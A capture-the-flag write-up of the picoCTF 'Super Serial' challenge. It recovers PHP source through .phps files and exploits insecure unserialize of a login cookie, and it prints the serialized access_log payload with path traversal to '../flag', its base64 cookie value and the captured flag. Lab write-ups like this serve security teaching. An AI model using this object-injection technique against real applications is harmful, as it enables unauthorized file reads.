# Super Serial  →  130 Pts.

## Me and 0xManan did this challenge together and hell yeah it was worth it.

1. We land on login page.
2. Serch for robots.txt
3. Found admin.phps
4. Opened admin.phps but it says not found.
5. So tried appending phps in index also. and viewed source page.
6. Got the source code with a php code.

``` php
<?php
require_once("cookie.php");

if(isset($_POST["user"]) && isset($_POST["pass"])){
$con = new SQLite3("../users.db");
$username = $_POST["user"];
$password = $_POST["pass"];
$perm_res = new permissions($username, $password);
if ($perm_res->is_guest() || $perm_res->is_admin()) {
setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
header("Location: authentication.php");
die();
} else {
$msg = '<h6 class="text-center" style="color:red">Invalid Login.</h6>';
}
}
?>
```

1. Found the _authentication.php_ file so tried getting in it but it says Forbidden (not allowed)

2. So tried _authentication.phps_ and got a source code

```php
<?php

function __construct($lf) {
	$this->log_file = $lf;
}

function __toString() {
	return $this->read_log();
}

function append_to_log($data) {
	file_put_contents($this->log_file, $data, FILE_APPEND);
}

function read_log() {
	return file_get_contents($this->log_file);
}
}

require_once("cookie.php");
if(isset($perm) && $perm->is_admin()){
$msg = "Welcome admin";
$log = new access_log("access.log");
$log->append_to_log("Logged in at ".date("Y-m-d")."\n");
} else {
$msg = "Welcome guest";
}
?>
```

1. So i saw that in second line we have _cookie.php_
2. Opened it and found 1 so i tried _cookie.phps_ to get the source code and it reverted back.

``` php
if(isset($_COOKIE["login"])){
try{
$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
$g = $perm->is_guest();
$a = $perm->is_admin();
}
catch(Error $e){
die("Deserialization error. ".$perm);
}
}

?>
```

1. What really caught my eye was the last part where we have a serialization info of cookie. The cookie value is URL Encoded -> Base64 Encoded -> Serialized.

2. I pasted the part of _authentication.php_ on online php editor

_script.php_

```php

<?php
class access_log
{
public $log_file;
function __construct($lf) {
	$this->log_file = $lf;
}

function __toString() {
	return $this->read_log();
}

function append_to_log($data) {
	file_put_contents($this->log_file, $data, FILE_APPEND);
}

function read_log() {
	return file_get_contents($this->log_file);
}
}

echo(serialize(new access_log("../flag")));
?>
```

1. Last line was added by me because we need a serialized value of the access.log but don't have permission to overwrite it so created a new access.log and then as per hint traversing the ../flag
2. Got the output:

`
💡 O:10:"access_log":1:{s:8:"log_file";s:7:"../flag";}
`


1. Decoded to Base64 and got

_TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9_

2. Tried going to index.php and created a new cookie named "login" and value =TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9 path=/authentication.php

3. Refreshed the page and then the deserialization error got me the flag

`
💡 picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_c5123066}
`

##  MADSTACK's MADNESS HAS OFFICIALLY BEGUN NOW!!!
